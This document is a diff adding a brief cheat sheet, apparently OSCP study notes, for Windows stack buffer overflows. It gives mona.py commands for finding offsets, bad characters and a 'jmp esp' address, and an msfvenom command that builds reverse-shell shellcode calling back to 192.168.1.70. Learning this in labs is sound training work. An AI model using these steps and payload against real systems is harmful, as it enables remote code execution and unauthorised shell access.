@@ -1,0 +1,21 @@
+# Setting current directories
+
+!mona config -set workingfolder c:\mona\%p
+
+# Finding offset with mona
+
+!mona findmsp -distance <crashed bytes EIP Address> <eg 600> # Note : For Crashed bytes we need EIP address  
+
+# Finding bad characters
+
+!mona bytearray -b "\x00"
+
+!mona compare -f C:\mona\oscp\bytearray.bin -a <ESP address> # Note : at 1st include 00 as bad char then run all the hex values to find bad chars after running then again run same command and also change esp values everytime you run the exploit.
+
+# Finding the jump point with the bad chars we have found while identifying bad chars
+
+!mona jmp -r esp -cpb "\x00" <include all bad chars we have found> 
+
+# Creating exploits
+
+msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.70 lport=445 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
